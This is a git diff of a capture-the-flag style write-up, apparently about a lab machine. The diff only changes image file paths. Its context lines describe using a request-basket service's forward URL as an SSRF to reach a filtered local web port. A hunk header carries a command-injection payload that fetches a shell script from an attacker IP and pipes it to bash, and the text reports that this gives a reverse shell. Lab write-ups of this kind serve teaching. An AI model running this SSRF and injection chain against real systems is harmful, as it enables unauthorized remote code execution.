@@ -23,19 +23,19 @@ Port 80 is being filtered, while port 55555 is open.&#x20;
 
 Port 55555 hosted an application that is able to collect and inspect HTTP requests:
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (10).png" alt=""><figcaption></figcaption></figure>
 
 We can create one by clicking on create:
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (12).png" alt=""><figcaption></figcaption></figure>
 
 Tihs acts similar to a webhook, and is able to retrieve requests sent to that unique URL.
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are able to set the Responses from the website. as well as where the traffic is being forwarded to, just like we can with Webhooks. Setting the Forward URL to our own HTTP server results in requests being sent there from the machine.
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
 Since port 80 was being filtered, we can set it to `http://localhost` and try setting all the options to True. Afterwards, sending GET requests to our bucket would result in HTML being returned:
 
@@ -63,7 +63,7 @@ $ curl -X POST --data 'username=;`curl 10.10.14.31/shell.sh|bash`' http://10.129
 
 We would get a reverse shell as `puma`:
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (12).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
